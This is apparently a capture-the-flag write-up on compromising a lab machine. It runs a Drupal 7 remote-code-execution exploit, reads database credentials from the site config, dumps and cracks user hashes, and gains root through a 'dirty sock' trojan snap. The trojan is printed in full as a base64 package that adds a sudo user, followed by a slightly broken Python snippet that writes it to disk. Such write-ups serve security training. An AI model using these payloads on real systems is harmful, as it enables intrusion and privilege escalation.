
# Enumeration

Some basic nmap scan let us know that this box has 2 opening ports, `22, 80`

Visit the website, navigate around. But I see nothing interested.

Tried to run some directory enumeration with `gobuster` but there is nothing interesting either.

So far, we got no information of what version of software is running on the website.
I go to Burp Suite, try to explore the requests to see if there is anything there.
And then I found something interesting, in the response header, there is a header

`X-..: Drupal 7` 
Now that is not a default header, it is a custom header. So I did some research and found out that Drupal is an CMS, and it has some known vulnerability with version < 7.58

I'd recommend you do some research about the vulnerability and how does it work before using the script for exploiting.

[Here](https://github.com/pimps/CVE-2018-7600/blob/master/drupa7-CVE-2018-7600.py) is the python script for that exploit

# Exploitation

With that python script above, we are able to get RCE on that machine, so first, we need to know how many users are in the system

```
cat /etc/passwd

...
brucetherealadmin:x:1000:1000::/home/brucetherealadmin:/bin/bash
```
Look like we have one user `brucetherealadmin`. 
Now as we all know how web applications work, when we have a web application is running on machine, we always have to check what port it is listening to and what database it is connecting to.

After some search for Drupal web config file, I was able to get this information, they are credentials for MySQL database running in the server

```
$databases = array (
  'default' =>
  array (
    'default' =>
    array (
      'database' => 'drupal',
      'username' => 'drupaluser',
      'password' => 'CQHEy@9M*m23gBVj',
      'host' => 'localhost',
      'port' => '',
      'driver' => 'mysql',
      'prefix' => '',
    ),
  ),
);
```

With database credentials, we can get user hashed passwords and crack them
```
mysql -u drupaluser -pCQHEy@9M*m23gBVj drupal -e "select username, password from users;"
```
Copy the hash to our local machine and we can use `hashcat` to crack it


User hash: $S$DgL2gjv6ZtxBo6CdqZEyJuBphBmrCqIV6W97.oOsUf1xAhaadURt

user cred: `brucetherealadmin: b****o`

# Post Exploitation

Root part was pretty straight forward. By some low hanging fruit enumeration, we will be able to find this interesting stuff.

```
sudo -l

(ALL) (NO PASSWD) sudo /usr/bin/snap install * 
```
SNAP is like a package manager.

I did some research about snap and its vulnerabilities, I found that SNAP had some vulneribility relate to what is called "Dirty Sock" . But unfortunately, our current SNAP version in our machine is not vulnerable to that.

So what should we do ?
I was kinda stuck on the root part for almost a day, I have to rethink about what do I need to carry out the exploit:
- We can run sudo install snap package, 
- If we can create some malicious snap package and when snap install it as root priv, it can do something for us

I tried to craft a snap package by myself via `snapcraft` with some basic reverse shell code in it but it won't work like that. Because you may install it as root priv, but when you execute that code, you are executing as `brucetherealadmin` user priv

When I come back to read the [dirty sock python](https://github.com/initstring/dirty_sock/blob/master/dirty_sockv2.py) script and see what they are doing, I found something interesting ... 

```
# The following global is a base64 encoded string representing an installable
# snap package. The snap itself is empty and has no functionality. It does,
# however, have a bash-script in the install hook that will create a new user.
# For full details, read the blog linked on the github page above.
TROJAN_SNAP = ('''
aHNxcwcAAAAQIVZcAAACAAAAAAAEABEA0AIBAAQAAADgAAAAAAAAAI4DAAAAAAAAhgMAAAAAAAD/
/////////xICAAAAAAAAsAIAAAAAAAA+AwAAAAAAAHgDAAAAAAAAIyEvYmluL2Jhc2gKCnVzZXJh
ZGQgZGlydHlfc29jayAtbSAtcCAnJDYkc1daY1cxdDI1cGZVZEJ1WCRqV2pFWlFGMnpGU2Z5R3k5
TGJ2RzN2Rnp6SFJqWGZCWUswU09HZk1EMXNMeWFTOTdBd25KVXM3Z0RDWS5mZzE5TnMzSndSZERo
T2NFbURwQlZsRjltLicgLXMgL2Jpbi9iYXNoCnVzZXJtb2QgLWFHIHN1ZG8gZGlydHlfc29jawpl
Y2hvICJkaXJ0eV9zb2NrICAgIEFMTD0oQUxMOkFMTCkgQUxMIiA+PiAvZXRjL3N1ZG9lcnMKbmFt
ZTogZGlydHktc29jawp2ZXJzaW9uOiAnMC4xJwpzdW1tYXJ5OiBFbXB0eSBzbmFwLCB1c2VkIGZv
ciBleHBsb2l0CmRlc2NyaXB0aW9uOiAnU2VlIGh0dHBzOi8vZ2l0aHViLmNvbS9pbml0c3RyaW5n
L2RpcnR5X3NvY2sKCiAgJwphcmNoaXRlY3R1cmVzOgotIGFtZDY0CmNvbmZpbmVtZW50OiBkZXZt
b2RlCmdyYWRlOiBkZXZlbAqcAP03elhaAAABaSLeNgPAZIACIQECAAAAADopyIngAP8AXF0ABIAe
rFoU8J/e5+qumvhFkbY5Pr4ba1mk4+lgZFHaUvoa1O5k6KmvF3FqfKH62aluxOVeNQ7Z00lddaUj
rkpxz0ET/XVLOZmGVXmojv/IHq2fZcc/VQCcVtsco6gAw76gWAABeIACAAAAaCPLPz4wDYsCAAAA
AAFZWowA/Td6WFoAAAFpIt42A8BTnQEhAQIAAAAAvhLn0OAAnABLXQAAan87Em73BrVRGmIBM8q2
XR9JLRjNEyz6lNkCjEjKrZZFBdDja9cJJGw1F0vtkyjZecTuAfMJX82806GjaLtEv4x1DNYWJ5N5
RQAAAEDvGfMAAWedAQAAAPtvjkc+MA2LAgAAAAABWVo4gIAAAAAAAAAAPAAAAAAAAAAAAAAAAAAA
AFwAAAAAAAAAwAAAAAAAAACgAAAAAAAAAOAAAAAAAAAAPgMAAAAAAAAEgAAAAACAAw'''
               + 'A' * 4256 + '==')
```

This binary has Snap file signature and it is contain malicioud code that help us create a new user that have root priv, this is exactly what we need !!!

I wrote this python script to carry out the exploit
```
# The following global is a base64 encoded string representing an installable
# snap package. The snap itself is empty and has no functionality. It does,
# however, have a bash-script in the install hook that will create a new user.
# For full details, read the blog linked on the github page above.
TROJAN_SNAP = ('''
aHNxcwcAAAAQIVZcAAACAAAAAAAEABEA0AIBAAQAAADgAAAAAAAAAI4DAAAAAAAAhgMAAAAAAAD/
/////////xICAAAAAAAAsAIAAAAAAAA+AwAAAAAAAHgDAAAAAAAAIyEvYmluL2Jhc2gKCnVzZXJh
ZGQgZGlydHlfc29jayAtbSAtcCAnJDYkc1daY1cxdDI1cGZVZEJ1WCRqV2pFWlFGMnpGU2Z5R3k5
TGJ2RzN2Rnp6SFJqWGZCWUswU09HZk1EMXNMeWFTOTdBd25KVXM3Z0RDWS5mZzE5TnMzSndSZERo
T2NFbURwQlZsRjltLicgLXMgL2Jpbi9iYXNoCnVzZXJtb2QgLWFHIHN1ZG8gZGlydHlfc29jawpl
Y2hvICJkaXJ0eV9zb2NrICAgIEFMTD0oQUxMOkFMTCkgQUxMIiA+PiAvZXRjL3N1ZG9lcnMKbmFt
ZTogZGlydHktc29jawp2ZXJzaW9uOiAnMC4xJwpzdW1tYXJ5OiBFbXB0eSBzbmFwLCB1c2VkIGZv
ciBleHBsb2l0CmRlc2NyaXB0aW9uOiAnU2VlIGh0dHBzOi8vZ2l0aHViLmNvbS9pbml0c3RyaW5n
L2RpcnR5X3NvY2sKCiAgJwphcmNoaXRlY3R1cmVzOgotIGFtZDY0CmNvbmZpbmVtZW50OiBkZXZt
b2RlCmdyYWRlOiBkZXZlbAqcAP03elhaAAABaSLeNgPAZIACIQECAAAAADopyIngAP8AXF0ABIAe
rFoU8J/e5+qumvhFkbY5Pr4ba1mk4+lgZFHaUvoa1O5k6KmvF3FqfKH62aluxOVeNQ7Z00lddaUj
rkpxz0ET/XVLOZmGVXmojv/IHq2fZcc/VQCcVtsco6gAw76gWAABeIACAAAAaCPLPz4wDYsCAAAA
AAFZWowA/Td6WFoAAAFpIt42A8BTnQEhAQIAAAAAvhLn0OAAnABLXQAAan87Em73BrVRGmIBM8q2
XR9JLRjNEyz6lNkCjEjKrZZFBdDja9cJJGw1F0vtkyjZecTuAfMJX82806GjaLtEv4x1DNYWJ5N5
RQAAAEDvGfMAAWedAQAAAPtvjkc+MA2LAgAAAAABWVo4gIAAAAAAAAAAPAAAAAAAAAAAAAAAAAAA
AFwAAAAAAAAAwAAAAAAAAACgAAAAAAAAAOAAAAAAAAAAPgMAAAAAAAAEgAAAAACAAw'''
               + 'A' * 4256 + '==')

 blob = base64.b64decode(TROJAN_SNAP)
 f = open("evil.snap", "w+b)
 f.write(blob)
 f.close()
 
```

After that, we can execute `sudo /usr/bin/snap install *` , and it will execute ours `evil.snap` file, and we have a new user with this credentials `dirtysock:dirtysock`

Using that creds, we can get root priv
